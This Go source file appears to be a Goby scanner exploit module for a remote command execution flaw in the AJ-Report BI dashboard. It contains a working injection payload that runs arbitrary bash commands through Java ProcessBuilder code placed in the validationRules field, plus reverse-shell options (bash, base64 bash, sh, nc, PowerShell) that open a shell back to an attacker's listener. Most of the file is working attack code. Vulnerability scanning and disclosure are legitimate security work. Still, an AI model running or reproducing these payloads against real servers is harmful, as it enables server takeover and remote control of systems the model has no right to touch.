package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "open-source data dashboard AJ-Report product /dataSetParam/verification;swagger-ui/ Remote Command Execution Vulnerability",
    "Description": "<p>AJ-Report is a completely open-source BI platform with a cool large-screen display, which can control business dynamics anytime and anywhere, so that every decision can be supported by data. Multi-data source support, built-in MySQL, Elasticsearch, Kudu and other drivers, support custom datasets without data interface development, support 17+ kinds of large screen components, will not develop, according to the design draft can also make large screen. The platform can execute commands in the corresponding value of the validationRules parameter in the post mode, obtain server permissions, and log in to the management background to take over the large screen</p>",
    "Product": " AJ-Report",
    "Homepage": "https://github.com/anji-plus/report",
    "DisclosureDate": "2024-05-10",
    "PostTime": "2024-05-20",
    "Author": "hr10086",
    "FofaQuery": "title=\"AJ-Report\"||body=\"chunk-elementUI.0805594c.js\"",
    "GobyQuery": "title=\"AJ-Report\"||body=\"chunk-elementUI.0805594c.js\"",
    "Level": "3",
    "Impact": "<p>This vulnerability is highly harmful, and an attacker can obtain full privileges on the server and execute arbitrary commands</p>",
    "Recommendation": "<p>The vulnerability has been officially fixed, please update to the latest version: <a href=\"https://github.com/anji-plus/report\">https://github.com/anji-plus/report</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s?__biz=MzU1ODQ2NTY3Ng==&mid=2247486542&idx=1&sn=2be06b22bab693fc89be39ce01dd99b7"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dataSetParam/verification;swagger-ui/",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/json;charset=UTF-8",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\": \"function verification(data){a = new java.lang.ProcessBuilder([\\\"/bin/bash\\\",\\\"-c\\\",\\\"echo ertyufghjvbnmtyhju\\\"]).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ertyufghjvbnmtyhju",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dataSetParam/verification;swagger-ui/",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/json;charset=UTF-8",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\": \"function verification(data){a = new java.lang.ProcessBuilder([\\\"/bin/bash\\\",\\\"-c\\\",\\\"{{{command}}}\\\"]).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"code\":\"200\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"data\":\"(.*)\""
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "开源数据大屏 AJ-Report 产品 /dataSetParam/verification;swagger-ui/ 远程命令执行漏洞",
            "Product": " AJ-Report",
            "Description": "<p>AJ-Report是一个完全开源的BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑。多数据源支持，内置mysql、elasticsearch、kudu等多种驱动，支持自定义数据集省去数据接口开发，支持17+种大屏组件，不会开发，照着设计稿也可以制作大屏。该平台可以通过post方式在validationRules参数对应值中进行命令执行，可以获得服务器权限，登陆管理后台接管大屏。<br></p>",
            "Recommendation": "<p>官方已经修复该漏洞，请更新到最新版：<a href=\"https://github.com/anji-plus/report\">https://github.com/anji-plus/report</a></p>",
            "Impact": "<p>该漏洞危害较高，攻击者可以获取服务器完整权限，执行任意命令。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "open-source data dashboard AJ-Report product /dataSetParam/verification;swagger-ui/ Remote Command Execution Vulnerability",
            "Product": " AJ-Report",
            "Description": "<p>AJ-Report is a completely open-source BI platform with a cool large-screen display, which can control business dynamics anytime and anywhere, so that every decision can be supported by data. Multi-data source support, built-in MySQL, Elasticsearch, Kudu and other drivers, support custom datasets without data interface development, support 17+ kinds of large screen components, will not develop, according to the design draft can also make large screen. The platform can execute commands in the corresponding value of the validationRules parameter in the post mode, obtain server permissions, and log in to the management background to take over the large screen<br></p>",
            "Recommendation": "<p>The vulnerability has been officially fixed, please update to the latest version: <a href=\"https://github.com/anji-plus/report\">https://github.com/anji-plus/report</a><br></p>",
            "Impact": "<p>This vulnerability is highly harmful, and an attacker can obtain full privileges on the server and execute arbitrary commands<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`
	setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
		PostRequest := httpclient.NewPostRequestConfig(urlGet)
		PostRequest.VerifyTls = false
		PostRequest.FollowRedirect = false
		for headName, headValue := range head {
			PostRequest.Header.Store(headName, headValue)
		}
		PostRequest.Data = data
		return httpclient.DoHttpRequest(hostInfo, PostRequest)
	}
	makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
		reRequestDDpoKbnd := regexp.MustCompile(RegularUrl)
		if !reRequestDDpoKbnd.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestDDpoKbnd.FindStringSubmatch(RegularContent)
		if len(getname) < 2 {
			return "", fmt.Errorf("substring not found")
		}
		return getname[1], nil
	}
	setPayloadRequestHash0001 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		url := "/dataSetParam/verification;swagger-ui/"
		data := "{\"ParamName\":\"\",\"paramDesc\":\"\",\"paramType\":\"\",\"sampleItem\":\"1\",\"mandatory\":true,\"requiredFlag\":1,\"validationRules\": \"function verification(data){a = new java.lang.ProcessBuilder([\\\"/bin/bash\\\",\\\"-c\\\",\\\""+command+"\\\"]).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}\"}"
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		head := map[string]string{"Content-Type": "application/json;charset=UTF-8"}
		commandResult := ""
		rep, err := setPostRequest(hostInfo, url, data, head)
		if err != nil {
			return "", "", err
		}
		RegularContent:=rep.Utf8Html
		RegularUrl:="\"data\":\"([^\"]*)\""
		Regular,err:=makeRegular(RegularContent,RegularUrl)
		if err!=nil{
			return "","",err
		}
		commandResult =Regular
		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "Bypowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
